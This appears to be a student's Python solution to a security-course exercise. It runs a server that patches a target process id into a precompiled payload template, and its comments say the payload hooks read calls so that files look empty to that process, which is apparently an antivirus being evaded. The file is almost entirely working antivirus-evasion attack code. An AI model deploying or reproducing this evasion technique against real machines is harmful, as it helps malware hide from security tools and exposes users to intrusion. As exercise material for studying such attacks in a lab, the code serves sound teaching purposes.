import assemble
import server
import struct
from addresses import address_to_bytes

PATH = "q4.template"

class SolutionServer(server.EvadeAntivirusServer):

    def get_payload(self, pid):
        # Return a payload that will intercept all calls to read (for all files)
        # with calls that read a length of 0 (to make files appear empty).
        # 1. You can assume we already compiled q4.c into q4.template.
        byte_pid = address_to_bytes(pid)
        with open(PATH, 'rb') as reader:
            data = reader.read()
        byte_dummy = address_to_bytes(0x12345678)
        data = data.replace(byte_dummy,byte_pid,1)
        return data

    def print_handler(self, payload, product):
        print(product)

    def evade_antivirus(self, pid):
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)

